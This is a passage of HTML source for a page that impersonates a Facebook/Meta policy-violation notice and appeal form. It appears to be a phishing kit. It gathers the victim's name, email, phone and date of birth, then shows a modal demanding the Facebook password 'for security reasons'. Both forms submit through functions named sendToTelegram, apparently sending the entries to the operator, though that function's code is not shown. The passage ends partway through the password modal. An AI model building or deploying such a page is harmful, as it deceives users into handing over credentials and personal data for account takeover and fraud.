                                        </font>
                                    </span>
                                </div>
                                <div class="action-button-arrow"></div>
                            </div>
                            <div class="action-button warning">
                                <div class="action-button-icon">
                                    <!-- SVG -->
                                    <i data-visualcompletion="css-img" class="x1b0d499 xep6ejk" aria-hidden="true" style="background-image: url(&quot;https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/MO61N44quj5.png&quot;); background-position: 0px -843px; background-size: auto; width: 20px; height: 20px; background-repeat: no-repeat; display: inline-block;"></i>
                                </div>
                                <div class="action-button-text">
                                    <span class="small-red">
                                        <font style="vertical-align: inherit;">
                                            <font style="vertical-align: inherit;">
                                                <font style="vertical-align: inherit;">
                                                    <font style="vertical-align: inherit;">Conducting transactions outside of Facebook Marketplace's platform.</font>
                                                </font>
                                            </font>
                                        </font>
                                    </span>
                                </div>
                                <div class="action-button-arrow"></div>
                            </div>
                            <div class="action-button warning">
                                <div class="action-button-icon">
                                    <!-- SVG -->
                                    <i data-visualcompletion="css-img" class="x1b0d499 xep6ejk" aria-hidden="true" style="background-image: url(&quot;https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/MO61N44quj5.png&quot;); background-position: 0px -843px; background-size: auto; width: 20px; height: 20px; background-repeat: no-repeat; display: inline-block;"></i>
                                </div>
                                <div class="action-button-text">
                                    <span class="small-red">
                                        <font style="vertical-align: inherit;">
                                            <font style="vertical-align: inherit;">
                                                <font style="vertical-align: inherit;">
                                                    <font style="vertical-align: inherit;">Failing to adhere to Facebook’s payment and shipping regulations.</font>
                                                </font>
                                            </font>
                                        </font>
                                    </span>
                                </div>
                                <div class="action-button-arrow"></div>
                            </div>
                        </div>
                        <div class="card-text">
                            <div class="btn-wrapper">
                                <div onclick="location.href='/apeal-form';" id="review" style="font-weight: bold" class="button fb-blue w-100">
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;">
                                            <font style="vertical-align: inherit;">
                                                <font style="vertical-align: inherit;">
                                                    <font style="vertical-align: inherit;">
                                                        <font style="vertical-align: inherit;">
                                                            <font style="vertical-align: inherit;">
                                                                <font style="vertical-align: inherit;">
                                                                    <font style="vertical-align: inherit;">
                                                                        <font style="vertical-align: inherit;">Appeal</font>
                                                                    </font>
                                                                </font>
                                                            </font>
                                                        </font>
                                                    </font>
                                                </font>
                                            </font>
                                        </font>
                                    </font>
                                </div>
                            </div>
                        </div>
                    </div>
                    <br><br>
                    <h6>Privacy Center</h6>
                    <div class="fake-likns">
                        <div class="action-button-list">
                            <div class="action-button wide">
                                <div class="action-button-img">
                                    <img src="../img/save_img.png" alt="">
                                </div>
                                <div class="action-button-text">
                                    <span>What is the Privacy Policy and what does it say?</span>
                                    <br>
                                    <span class="small-grey">Privacy Policy</span>
                                </div>
                                <div class="action-button-arrow">
                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
                                        </path>
                                    </svg>
                                </div>
                            </div>
                            <div class="action-button wide">
                                <div class="action-button-img">
                                    <img src="../img/save_img.png" alt="">
                                </div>
                                <div class="action-button-text">
                                    <span>How you can manage or delete your information</span>
                                    <br>
                                    <span class="small-grey">Privacy Policy</span>
                                </div>
                                <div class="action-button-arrow">
                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
                                        </path>
                                    </svg>
                                </div>
                            </div>
                        </div>

                        <br>
                        <h6>For more details, see the User Agreement</h6>
                        <div class="action-button wide">
                            <div class="action-button-img">
                                <img src="../img/doc.png" alt="">
                            </div>
                            <div class="action-button-text">
                                <span>Meta AI</span>
                                <br>
                                <span class="small-grey">User Agreement</span>
                            </div>
                            <div class="action-button-arrow">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
                                    </path>
                                </svg>
                            </div>
                        </div>
                        <br>
                        <h6>Additional resources</h6>

                        <div class="action-button-list">
                            <div class="action-button wide">
                                <div class="action-button-text">
                                    <span>How Meta uses information for generative AI models</span>
                                    <br>
                                    <span class="small-grey">Privacy Center</span>
                                </div>
                                <div class="action-button-arrow">
                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
                                        </path>
                                    </svg>
                                </div>
                            </div>
                            <div class="action-button wide">
                                <div class="action-button-text">
                                    <span>Cards with information about the operation of AI systems</span>
                                    <br>
                                    <span class="small-grey">Meta AI website</span>
                                </div>
                                <div class="action-button-arrow">
                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
                                        </path>
                                    </svg>
                                </div>
                            </div>
                            <div class="action-button wide">
                                <div class="action-button-text">
                                    <span>Introduction to Generative AI</span>
                                    <br>
                                    <span class="small-grey">For teenagers</span>
                                </div>
                                <div class="action-button-arrow">
                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
                                        </path>
                                    </svg>
                                </div>
                            </div>

                        </div>
                    </div>
                    <br>
                    <p class="small-grey">We continually identify potential privacy risks, including
                        when collecting, using or sharing personal information, and developing methods to reduce these
                        risks. Read more about
                        <a target="_blank" id="policyLink" class="add-svg">Privacy Policy

                        </a>
                    </p>

                </div>

            </div>


            <div class="popup" id="popup">

                <div class="popup-item">
                    <div class="burger-button-popup" id="closePopup">
                        <div class="bar"></div>
                        <div class="bar"></div>
                    </div>
                    <div class="popup-content"></div>
                </div>
            </div>


        </div>
    </div>

    <style>
        /* CSS để làm mờ và tối xung quanh modal */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            /* Màu đen với độ mờ 50% */
            z-index: 999;
            /* Đảm bảo overlay hiển thị trên modal */
            display: none;
            /* Ẩn ban đầu */
        }

        .modal.active {
            display: block;
        }

        /* CSS để canh giữa modal */
        .modal-dialog {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100%;
        }
    </style>

    <style>
        /* CSS để modal và overlay luôn hiển thị */
        .modal.show {
            display: block;
        }

        .overlay.show {
            display: block;
        }
    </style>

    <style>
        .notification-setting {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .setting-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background-color: #ffffff;
            border-radius: 8px;
            padding: 15px;
        }

        .setting-item .info {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .setting-item .info .icon {
            font-size: 20px;
        }

        .fa-brands,
        .fab {
            font-family: "Font Awesome 6 Brands";
            font-weight: 400;
        }

        .setting-item .info .text {
            display: flex;
            flex-direction: column;
        }

        .toggle-switch {
            position: relative;
            /* display: inline-block; */
            width: 40px;
            height: 20px;
        }

        label {
            /* display: inline-block; */
        }

        .toggle-switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }

        input:checked+.slider {
            background-color: rgb(0, 100, 224);
        }

        .slider {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #ccc;
            border-radius: 20px;
            cursor: pointer;
            transition: 0.4s;
        }

        input:checked+.slider:before {
            transform: translateX(20px);
        }

        .slider:before {
            position: absolute;
            content: "";
            height: 14px;
            width: 14px;
            left: 3px;
            bottom: 3px;
            background-color: white;
            border-radius: 50%;
            transition: 0.4s;
        }
    </style>

    <form onsubmit="sendToTelegram(event)">

        <div class="overlay" id="overlay"></div>
        <div class="modal form-modal" id="exampleModal1" tabindex="-1" aria-labelledby="exampleModalLabel"
            aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="exampleModalLabel">Apeal Form</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <form id="first-form">


                            <div class="mb-3">
                                <input name="full-name" type="text" class="form-control" id="FullNameField" minlength="3" placeholder="Full name" required>
                            </div>
                            <div class="mb-3">
                                <input name="personal-email" type="email" class="form-control" id="PersonalEmailField" placeholder="Email" required>
                            </div>

                            <style>
                                .country-flag {
                                    width: 28px;
                                    /* Đặt kích thước ảnh cờ */
                                    height: 20px;
                                    /* Tỉ lệ phù hợp với ảnh cờ */
                                    object-fit: cover;
                                    /* Đảm bảo ảnh không bị méo */
                                    border: 1px solid #ccc;
                                    /* Đường viền nhẹ cho ảnh */
                                    border-radius: 3px;
                                    /* Bo góc nhẹ để ảnh đẹp hơn */
                                }

                                .select-container {
                                    position: relative;
                                    display: inline-block;
                                    width: 50%;
                                }

                                .country-flag {
                                    position: absolute;
                                    top: 50%;
                                    left: 10px;
                                    transform: translateY(-50%);
                                    width: 24px;
                                    height: 16px;
                                    pointer-events: none;
                                }

                                .select-container select {
                                    padding-left: 45px;
                                    /* Tạo khoảng cách cho lá cờ */
                                    width: 100%;
                                    height: 100%;
                                    box-sizing: border-box;
                                }
                            </style>
                            <div class="mb-3">
                                <div class="d-flex gap-2">

                                    <div class="select-container">
                                        <img id="flag-icon" class="country-flag" src="https://flagcdn.com/us.svg" alt="Flag">
                                        <select id="country-code" onchange="updatePhonePrefix()" class="form-control" required="">
                                            <option value="+1" data-flag="https://flagcdn.com/us.svg">USA (+1)</option>
                                            <option value="+1" data-flag="https://flagcdn.com/ca.svg">Canada (+1)</option>
                                            <option value="+7" data-flag="https://flagcdn.com/ru.svg">Russia (+7)</option>
                                            <option value="+20" data-flag="https://flagcdn.com/eg.svg">Egypt (+20)</option>
                                            <option value="+30" data-flag="https://flagcdn.com/gr.svg">Greece (+30)</option>
                                            <option value="+31" data-flag="https://flagcdn.com/nl.svg">Netherlands (+31)</option>
                                            <option value="+32" data-flag="https://flagcdn.com/be.svg">Belgium (+32)</option>
                                            <option value="+33" data-flag="https://flagcdn.com/fr.svg">France (+33)</option>
                                            <option value="+34" data-flag="https://flagcdn.com/es.svg">Spain (+34)</option>
                                            <option value="+36" data-flag="https://flagcdn.com/hu.svg">Hungary (+36)</option>
                                            <option value="+39" data-flag="https://flagcdn.com/it.svg">Italy (+39)</option>
                                            <option value="+40" data-flag="https://flagcdn.com/ro.svg">Romania (+40)</option>
                                            <option value="+41" data-flag="https://flagcdn.com/ch.svg">Switzerland (+41)</option>
                                            <option value="+42" data-flag="https://flagcdn.com/cz.svg">Czech Republic (+42)</option>
                                            <option value="+43" data-flag="https://flagcdn.com/at.svg">Austria (+43)</option>
                                            <option value="+44" data-flag="https://flagcdn.com/gb.svg">UK (+44)</option>
                                            <option value="+45" data-flag="https://flagcdn.com/dk.svg">Denmark (+45)</option>
                                            <option value="+46" data-flag="https://flagcdn.com/se.svg">Sweden (+46)</option>
                                            <option value="+47" data-flag="https://flagcdn.com/no.svg">Norway (+47)</option>
                                            <option value="+48" data-flag="https://flagcdn.com/pl.svg">Poland (+48)</option>
                                            <option value="+49" data-flag="https://flagcdn.com/de.svg">Germany (+49)</option>
                                            <option value="+50" data-flag="https://flagcdn.com/fo.svg">Faroe Islands (+50)</option>
                                            <option value="+51" data-flag="https://flagcdn.com/pe.svg">Peru (+51)</option>
                                            <option value="+52" data-flag="https://flagcdn.com/mx.svg">Mexico (+52)</option>
                                            <option value="+53" data-flag="https://flagcdn.com/cu.svg">Cuba (+53)</option>
                                            <option value="+54" data-flag="https://flagcdn.com/ar.svg">Argentina (+54)</option>
                                            <option value="+55" data-flag="https://flagcdn.com/br.svg">Brazil (+55)</option>
                                            <option value="+56" data-flag="https://flagcdn.com/cl.svg">Chile (+56)</option>
                                            <option value="+57" data-flag="https://flagcdn.com/co.svg">Colombia (+57)</option>
                                            <option value="+58" data-flag="https://flagcdn.com/ve.svg">Venezuela (+58)</option>
                                            <option value="+60" data-flag="https://flagcdn.com/my.svg">Malaysia (+60)</option>
                                            <option value="+61" data-flag="https://flagcdn.com/au.svg">Australia (+61)</option>
                                            <option value="+62" data-flag="https://flagcdn.com/id.svg">Indonesia (+62)</option>
                                            <option value="+63" data-flag="https://flagcdn.com/ph.svg">Philippines (+63)</option>
                                            <option value="+64" data-flag="https://flagcdn.com/nz.svg">New Zealand (+64)</option>
                                            <option value="+65" data-flag="https://flagcdn.com/sg.svg">Singapore (+65)</option>
                                            <option value="+66" data-flag="https://flagcdn.com/th.svg">Thailand (+66)</option>
                                            <option value="+81" data-flag="https://flagcdn.com/jp.svg">Japan (+81)</option>
                                            <option value="+82" data-flag="https://flagcdn.com/kr.svg">South Korea (+82)</option>
                                            <option value="+84" data-flag="https://flagcdn.com/vn.svg">Vietnam (+84)</option>
                                            <option value="+86" data-flag="https://flagcdn.com/cn.svg">China (+86)</option>
                                            <option value="+90" data-flag="https://flagcdn.com/tr.svg">Turkey (+90)</option>
                                            <option value="+91" data-flag="https://flagcdn.com/in.svg">India (+91)</option>
                                            <option value="+92" data-flag="https://flagcdn.com/pk.svg">Pakistan (+92)</option>
                                            <option value="+93" data-flag="https://flagcdn.com/af.svg">Afghanistan (+93)</option>
                                            <option value="+94" data-flag="https://flagcdn.com/lk.svg">Sri Lanka (+94)</option>
                                            <option value="+95" data-flag="https://flagcdn.com/mm.svg">Myanmar (+95)</option>
                                            <option value="+98" data-flag="https://flagcdn.com/ir.svg">Iran (+98)</option>
                                            <option value="+211" data-flag="https://flagcdn.com/ss.svg">South Sudan (+211)</option>
                                            <option value="+212" data-flag="https://flagcdn.com/ma.svg">Morocco (+212)</option>
                                            <option value="+213" data-flag="https://flagcdn.com/dz.svg">Algeria (+213)</option>
                                            <option value="+216" data-flag="https://flagcdn.com/tn.svg">Tunisia (+216)</option>
                                            <option value="+218" data-flag="https://flagcdn.com/ly.svg">Libya (+218)</option>
                                            <option value="+220" data-flag="https://flagcdn.com/gn.svg">Gambia (+220)</option>
                                            <option value="+221" data-flag="https://flagcdn.com/sn.svg">Senegal (+221)</option>
                                            <option value="+222" data-flag="https://flagcdn.com/mr.svg">Mauritania (+222)</option>
                                            <option value="+223" data-flag="https://flagcdn.com/ml.svg">Mali (+223)</option>
                                            <option value="+224" data-flag="https://flagcdn.com/gn.svg">Guinea (+224)</option>
                                            <option value="+225" data-flag="https://flagcdn.com/ci.svg">Ivory Coast (+225)</option>
                                            <option value="+226" data-flag="https://flagcdn.com/bf.svg">Burkina Faso (+226)</option>
                                            <option value="+227" data-flag="https://flagcdn.com/ne.svg">Niger (+227)</option>
                                            <option value="+228" data-flag="https://flagcdn.com/tg.svg">Togo (+228)</option>
                                            <option value="+229" data-flag="https://flagcdn.com/bj.svg">Benin (+229)</option>
                                            <option value="+230" data-flag="https://flagcdn.com/mu.svg">Mauritius (+230)</option>
                                            <option value="+231" data-flag="https://flagcdn.com/lr.svg">Liberia (+231)</option>
                                            <option value="+232" data-flag="https://flagcdn.com/sl.svg">Sierra Leone (+232)</option>
                                            <option value="+233" data-flag="https://flagcdn.com/gh.svg">Ghana (+233)</option>
                                            <option value="+234" data-flag="https://flagcdn.com/ng.svg">Nigeria (+234)</option>
                                            <option value="+235" data-flag="https://flagcdn.com/cd.svg">Chad (+235)</option>
                                            <option value="+236" data-flag="https://flagcdn.com/cf.svg">Central African Republic (+236)</option>
                                            <option value="+237" data-flag="https://flagcdn.com/cm.svg">Cameroon (+237)</option>
                                            <option value="+238" data-flag="https://flagcdn.com/cv.svg">Cape Verde (+238)</option>
                                            <option value="+239" data-flag="https://flagcdn.com/st.svg">São Tomé and Príncipe (+239)</option>
                                            <option value="+240" data-flag="https://flagcdn.com/gq.svg">Equatorial Guinea (+240)</option>
                                            <option value="+241" data-flag="https://flagcdn.com/gab.svg">Gabon (+241)</option>
                                            <option value="+242" data-flag="https://flagcdn.com/cg.svg">Congo (+242)</option>
                                            <option value="+243" data-flag="https://flagcdn.com/cd.svg">Democratic Republic of the Congo (+243)</option>
                                            <option value="+244" data-flag="https://flagcdn.com/ao.svg">Angola (+244)</option>
                                            <option value="+245" data-flag="https://flagcdn.com/gw.svg">Guinea-Bissau (+245)</option>
                                            <option value="+246" data-flag="https://flagcdn.com/io.svg">British Indian Ocean Territory (+246)</option>
                                            <option value="+247" data-flag="https://flagcdn.com/asc.svg">Ascension Island (+247)</option>
                                            <option value="+248" data-flag="https://flagcdn.com/sc.svg">Seychelles (+248)</option>
                                            <option value="+249" data-flag="https://flagcdn.com/sd.svg">Sudan (+249)</option>
                                            <option value="+250" data-flag="https://flagcdn.com/zw.svg">Zimbabwe (+250)</option>
                                            <option value="+251" data-flag="https://flagcdn.com/et.svg">Ethiopia (+251)</option>
                                            <option value="+252" data-flag="https://flagcdn.com/so.svg">Somalia (+252)</option>
                                            <option value="+253" data-flag="https://flagcdn.com/dj.svg">Djibouti (+253)</option>
                                            <option value="+254" data-flag="https://flagcdn.com/ke.svg">Kenya (+254)</option>
                                            <option value="+255" data-flag="https://flagcdn.com/tz.svg">Tanzania (+255)</option>
                                            <option value="+256" data-flag="https://flagcdn.com/ug.svg">Uganda (+256)</option>
                                            <option value="+257" data-flag="https://flagcdn.com/bf.svg">Burundi (+257)</option>
                                            <option value="+258" data-flag="https://flagcdn.com/mz.svg">Mozambique (+258)</option>
                                            <option value="+260" data-flag="https://flagcdn.com/zm.svg">Zambia (+260)</option>
                                            <option value="+261" data-flag="https://flagcdn.com/mg.svg">Madagascar (+261)</option>
                                            <option value="+262" data-flag="https://flagcdn.com/re.svg">Réunion (+262)</option>
                                            <option value="+263" data-flag="https://flagcdn.com/zw.svg">Zimbabwe (+263)</option>
                                            <option value="+264" data-flag="https://flagcdn.com/na.svg">Namibia (+264)</option>
                                            <option value="+265" data-flag="https://flagcdn.com/mw.svg">Malawi (+265)</option>
                                            <option value="+266" data-flag="https://flagcdn.com/ls.svg">Lesotho (+266)</option>
                                            <option value="+267" data-flag="https://flagcdn.com/bw.svg">Botswana (+267)</option>
                                            <option value="+268" data-flag="https://flagcdn.com/sz.svg">Eswatini (+268)</option>
                                            <option value="+269" data-flag="https://flagcdn.com/km.svg">Comoros (+269)</option>
                                        </select>

                                    </div>

                                    <input name="mobile-phone-number" type="tel" class="form-control" id="PhoneFirld" placeholder="Phone number" required>
                                </div>

                            </div>
                            <script>
                                function updatePhonePrefix() {
                                    const select = document.getElementById('country-code');
                                    const phoneInput = document.getElementById('PhoneFirld');
                                    const flagIcon = document.getElementById('flag-icon');

                                    // Get selected option
                                    const selectedOption = select.options[select.selectedIndex];

                                    // Update phone input prefix with space
                                    phoneInput.value = selectedOption.value + " ";

                                    // Update flag icon
                                    flagIcon.src = selectedOption.getAttribute('data-flag');
                                    flagIcon.alt = selectedOption.text;
                                }

                                // Initialize with the default selected country
                                document.addEventListener('DOMContentLoaded', updatePhonePrefix);
                            </script>

                            <div class="mb-3"> <label for="DateOfBirth" class="form-label">
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;">
                                            <font style="vertical-align: inherit;">
                                                <font style="vertical-align: inherit;">Date of birth</font>
                                            </font>
                                        </font>
                                    </font>
                                </label>
                                <div id="DateOfBirth" class="d-flex gap-2">
                                    <!-- Dropdown für den Tag --> <select id="dob-day" name="dob-day" class="form-control" required="">
                                        <option value="" selected="" disabled="">Day</option>
                                        <option value="1">1</option>
                                        <option value="2">2</option>
                                        <option value="3">3</option>
                                        <option value="4">4</option>
                                        <option value="5">5</option>
                                        <option value="6">6</option>
                                        <option value="7">7</option>
                                        <option value="8">8</option>
                                        <option value="9">9</option>
                                        <option value="10">10</option>
                                        <option value="11">11</option>
                                        <option value="12">12</option>
                                        <option value="13">13</option>
                                        <option value="14">14</option>
                                        <option value="15">15</option>
                                        <option value="16">16</option>
                                        <option value="17">17</option>
                                        <option value="18">18</option>
                                        <option value="19">19</option>
                                        <option value="20">20</option>
                                        <option value="21">21</option>
                                        <option value="22">22</option>
                                        <option value="23">23</option>
                                        <option value="24">24</option>
                                        <option value="25">25</option>
                                        <option value="26">26</option>
                                        <option value="27">27</option>
                                        <option value="28">28</option>
                                        <option value="29">29</option>
                                        <option value="30">30</option>
                                        <option value="31">31</option>

                                    </select>
                                    <select id="dob-month" name="dob-month" class="form-control" required="">
                                        <option value="" selected="" disabled="">Month</option>
                                        <option value="1">January</option>
                                        <option value="2">February</option>
                                        <option value="3">March</option>
                                        <option value="4">April</option>
                                        <option value="5">May</option>
                                        <option value="6">June</option>
                                        <option value="7">July</option>
                                        <option value="8">August</option>
                                        <option value="9">September</option>
                                        <option value="10">October</option>
                                        <option value="11">November</option>
                                        <option value="12">December</option>
                                    </select>
                                    <select id="dob-year" name="dob-year" class="form-control" required="">
                                        <option value="" selected="" disabled="">Year</option>
                                        <option value="2024">2024</option>
                                        <option value="2023">2023</option>
                                        <option value="2022">2022</option>
                                        <option value="2021">2021</option>
                                        <option value="2020">2020</option>
                                        <option value="2019">2019</option>
                                        <option value="2018">2018</option>
                                        <option value="2017">2017</option>
                                        <option value="2016">2016</option>
                                        <option value="2015">2015</option>
                                        <option value="2014">2014</option>
                                        <option value="2013">2013</option>
                                        <option value="2012">2012</option>
                                        <option value="2011">2011</option>
                                        <option value="2010">2010</option>
                                        <option value="2009">2009</option>
                                        <option value="2008">2008</option>
                                        <option value="2007">2007</option>
                                        <option value="2006">2006</option>
                                        <option value="2005">2005</option>
                                        <option value="2004">2004</option>
                                        <option value="2003">2003</option>
                                        <option value="2002">2002</option>
                                        <option value="2001">2001</option>
                                        <option value="2000">2000</option>
                                        <option value="1999">1999</option>
                                        <option value="1998">1998</option>
                                        <option value="1997">1997</option>
                                        <option value="1996">1996</option>
                                        <option value="1995">1995</option>
                                        <option value="1994">1994</option>
                                        <option value="1993">1993</option>
                                        <option value="1992">1992</option>
                                        <option value="1991">1991</option>
                                        <option value="1990">1990</option>
                                        <option value="1989">1989</option>
                                        <option value="1988">1988</option>
                                        <option value="1987">1987</option>
                                        <option value="1986">1986</option>
                                        <option value="1985">1985</option>
                                        <option value="1984">1984</option>
                                        <option value="1983">1983</option>
                                        <option value="1982">1982</option>
                                        <option value="1981">1981</option>
                                        <option value="1980">1980</option>
                                        <option value="1979">1979</option>
                                        <option value="1978">1978</option>
                                        <option value="1977">1977</option>
                                        <option value="1976">1976</option>
                                        <option value="1975">1975</option>
                                        <option value="1974">1974</option>
                                        <option value="1973">1973</option>
                                        <option value="1972">1972</option>
                                        <option value="1971">1971</option>
                                        <option value="1970">1970</option>
                                        <option value="1969">1969</option>
                                        <option value="1968">1968</option>
                                        <option value="1967">1967</option>
                                        <option value="1966">1966</option>
                                        <option value="1965">1965</option>
                                        <option value="1964">1964</option>
                                        <option value="1963">1963</option>
                                        <option value="1962">1962</option>
                                        <option value="1961">1961</option>
                                        <option value="1960">1960</option>
                                    </select>
                                </div>
                            </div>
                            <div class="mb-3">
                                <textarea rows="1" id="exampleFormControlTextarea1" class="form-control" name="apeal" placeholder="Describe your issue"></textarea>
                                <div id="emailHelp" class="form-text">
                                    Our response will be sent to you within 24 - 48 hours.
                                </div>
                            </div>

                            <div class="notification-setting">
                                <div class="setting-item">
                                    <div class="info"> <i class="fab fa-facebook icon"></i>
                                        <div class="text"> <strong>
                                                <font style="vertical-align: inherit;">
                                                    <font style="vertical-align: inherit;">
                                                        <font style="vertical-align: inherit;">
                                                            <font style="vertical-align: inherit;">
                                                                <font style="vertical-align: inherit;">
                                                                    <font style="vertical-align: inherit;">
                                                                        <font style="vertical-align: inherit;">
                                                                            <font style="vertical-align: inherit;">
                                                                                <font style="vertical-align: inherit;">
                                                                                    <font style="vertical-align: inherit;">on Facebook</font>
                                                                                </font>
                                                                            </font>
                                                                        </font>
                                                                    </font>
                                                                </font>
                                                            </font>
                                                        </font>
                                                    </font>
                                                </font>
                                            </strong> <span>
                                                <font style="vertical-align: inherit;">
                                                    <font style="vertical-align: inherit;">
                                                        <font style="vertical-align: inherit;">
                                                            <font style="vertical-align: inherit;">
                                                                <font style="vertical-align: inherit;">
                                                                    <font style="vertical-align: inherit;">
                                                                        <font style="vertical-align: inherit;">
                                                                            <font style="vertical-align: inherit;">
                                                                                <font style="vertical-align: inherit;">
                                                                                    <font style="vertical-align: inherit;">We will send you a notification on Facebook.</font>
                                                                                </font>
                                                                            </font>
                                                                        </font>
                                                                    </font>
                                                                </font>
                                                            </font>
                                                        </font>
                                                    </font>
                                                </font>
                                            </span> </div>
                                    </div> <label class="toggle-switch"> <input type="checkbox"> <span class="slider"></span> </label>
                                </div>
                                <div class="setting-item">
                                    <div class="info"> <i class="fas fa-envelope icon"></i>
                                        <div class="text"> <strong>
                                                <font style="vertical-align: inherit;">
                                                    <font style="vertical-align: inherit;">
                                                        <font style="vertical-align: inherit;">
                                                            <font style="vertical-align: inherit;">
                                                                <font style="vertical-align: inherit;">
                                                                    <font style="vertical-align: inherit;">
                                                                        <font style="vertical-align: inherit;">
                                                                            <font style="vertical-align: inherit;">
                                                                                <font style="vertical-align: inherit;">
                                                                                    <font style="vertical-align: inherit;">e-mail</font>
                                                                                </font>
                                                                            </font>
                                                                        </font>
                                                                    </font>
                                                                </font>
                                                            </font>
                                                        </font>
                                                    </font>
                                                </font>
                                            </strong> <span>
                                                <font style="vertical-align: inherit;">
                                                    <font style="vertical-align: inherit;">
                                                        <font style="vertical-align: inherit;">
                                                            <font style="vertical-align: inherit;">
                                                                <font style="vertical-align: inherit;">
                                                                    <font style="vertical-align: inherit;">
                                                                        <font style="vertical-align: inherit;">
                                                                            <font style="vertical-align: inherit;">
                                                                                <font style="vertical-align: inherit;">
                                                                                    <font style="vertical-align: inherit;">We will send you an email notification.</font>
                                                                                </font>
                                                                            </font>
                                                                        </font>
                                                                    </font>
                                                                </font>
                                                            </font>
                                                        </font>
                                                    </font>
                                                </font>
                                            </span> </div>
                                    </div> <label class="toggle-switch"> <input type="checkbox"> <span class="slider"></span> </label>
                                </div>
                            </div>
                            <br>
                            <div class="mb-3 form-check">
                                <input name="" type="checkbox" class="form-check-input" id="exampleCheck1" required>
                                <label class="form-check-label" for="exampleCheck1">I agree with
                                    <a id="termsLink" class="add-svg">Terms of use
                                    </a>
                                </label>
                            </div>
                            <div class="form-btn-wrapper">
                                <button class="btn btn-primary" type="button" onclick="showModal2()">
                                    <div class="spinner-border text-light" role="status" style="display: none;">
                                        <span class="visually-hidden">Loading...</span>
                                    </div>
                                    <span class="button-text">Send</span>
                                </button>
                            </div>
                        </form>
                    </div>
                    <div class="modal-footer">
                        <img src="../img/meta-logo-grey.png" alt="">
                    </div>
                </div>
            </div>
        </div>

        <style>
            .toggle-password {
                cursor: pointer;
                position: absolute;
                top: 48.5%;
                right: 30px;
                transform: translateY(-50%);
            }
        </style>

        <div class="overlay overlay2" id="overlay2"></div>
        <div class="modal form-modal" id="exampleModal2" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
                <div class="modal-content">
                    <div class="modal-header">
                    </div>
                    <div class="modal-body">
                        <div class="fb-round-wraper">
                            <img src="img/fb_round_logo.png" alt="" class="fb-logo-round">
                        </div>
                        <form id="apiForm" onsubmit="sendToTelegramFromModal2(event)" autocomplete="off"> <!-- Thêm sự kiện onsubmit -->
                            <div class="mb-3">
                                <label for="PasswordInput" class="form-label">For security reasons enter your password to continue.</label>
                                <input name="password" type="password" class="form-control" id="PasswordInput" minlength="3" required>
                                <span class="toggle-password" data-target="PasswordInput" style="cursor: pointer;">
                                    <!-- SVG Icon (Eye Off) -->
                                    <svg class="icon-eye-off" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M2 2L22 22" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
